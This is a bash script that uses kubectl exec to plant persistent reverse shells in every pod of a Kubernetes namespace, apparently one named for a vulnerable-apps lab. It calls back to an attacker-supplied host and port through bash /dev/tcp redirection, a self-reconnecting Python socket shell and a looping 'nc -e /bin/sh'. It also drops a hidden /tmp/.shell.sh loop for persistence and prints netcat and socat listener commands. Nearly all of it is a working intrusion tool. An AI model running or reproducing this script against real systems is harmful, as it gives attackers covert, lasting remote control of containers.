#!/bin/bash

# Script to establish persistent reverse shells from containers
# Accessible from outside AWS using ngrok or similar

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"
ATTACKER_IP="${2:-}"
ATTACKER_PORT="${3:-4444}"
METHOD="${4:-all}"

echo -e "${BLUE}=== Persistent Reverse Shell ===${NC}\n"

if [ -z "$ATTACKER_IP" ]; then
    echo -e "${RED}Usage: $0 <NAMESPACE> <ATTACKER_IP> <ATTACKER_PORT> [METHOD]${NC}"
    echo "Example: $0 vulnerable-apps your-public-ip.com 4444"
    echo ""
    echo "Available methods:"
    echo "  all      - Try all methods"
    echo "  bash     - Use bash"
    echo "  python   - Use python"
    echo "  nc       - Use netcat"
    echo "  socat    - Use socat"
    echo "  perl     - Use perl"
    echo "  php      - Use php"
    exit 1
fi

# Get pods
PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "")

if [ -z "$PODS" ]; then
    echo -e "${RED}No pods found in $NAMESPACE${NC}"
    exit 1
fi

# Function to establish reverse shell with bash
setup_bash_shell() {
    local POD=$1
    echo -e "${YELLOW}  Setting up bash reverse shell in $POD...${NC}"
    
    kubectl exec -it "$POD" -n "$NAMESPACE" -- bash -c "nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &" 2>/dev/null && \
        echo -e "${GREEN}    ✓ Bash shell configured${NC}" || \
        echo -e "${RED}    ✗ Error with bash${NC}"
}

# Function to establish reverse shell with python
setup_python_shell() {
    local POD=$1
    echo -e "${YELLOW}  Setting up python reverse shell in $POD...${NC}"
    
    kubectl exec -it "$POD" -n "$NAMESPACE" -- python3 -c "
import socket,subprocess,os,threading,time
def connect():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('$ATTACKER_IP',$ATTACKER_PORT))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(['/bin/sh','-i'])
    except:
        time.sleep(5)
        connect()
connect()
" 2>/dev/null &
    
    echo -e "${GREEN}    ✓ Python shell configured${NC}"
}

# Function to establish reverse shell with netcat
setup_nc_shell() {
    local POD=$1
    echo -e "${YELLOW}  Setting up netcat reverse shell in $POD...${NC}"
    
    kubectl exec -it "$POD" -n "$NAMESPACE" -- sh -c "while true; do nc -e /bin/sh $ATTACKER_IP $ATTACKER_PORT 2>/dev/null || sleep 5; done" &
    
    echo -e "${GREEN}    ✓ Netcat shell configured${NC}"
}

# Function to create persistent script in pod
create_persistent_shell() {
    local POD=$1
    echo -e "${YELLOW}  Creating persistent script in $POD...${NC}"
    
    kubectl exec -it "$POD" -n "$NAMESPACE" -- sh -c "cat > /tmp/.shell.sh <<'EOF'
#!/bin/sh
while true; do
    /bin/sh -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null || sleep 10
done
EOF
chmod +x /tmp/.shell.sh
nohup /tmp/.shell.sh > /dev/null 2>&1 &" 2>/dev/null
    
    echo -e "${GREEN}    ✓ Persistent script created${NC}"
}

# Establish shells in all pods
for POD in $PODS; do
    echo -e "\n${BLUE}Processing pod: $POD${NC}"
    
    case $METHOD in
        bash)
            setup_bash_shell "$POD"
            ;;
        python)
            setup_python_shell "$POD"
            ;;
        nc|netcat)
            setup_nc_shell "$POD"
            ;;
        all)
            setup_bash_shell "$POD"
            setup_python_shell "$POD"
            create_persistent_shell "$POD"
            ;;
        *)
            echo -e "${RED}Unknown method: $METHOD${NC}"
            ;;
    esac
done

echo -e "\n${GREEN}=== Reverse Shells Configured ===${NC}"
echo -e "${YELLOW}Listen on your machine with:${NC}"
echo -e "${GREEN}nc -lvp $ATTACKER_PORT${NC}"
echo -e "${YELLOW}Or with socat:${NC}"
echo -e "${GREEN}socat - TCP4-LISTEN:$ATTACKER_PORT${NC}"
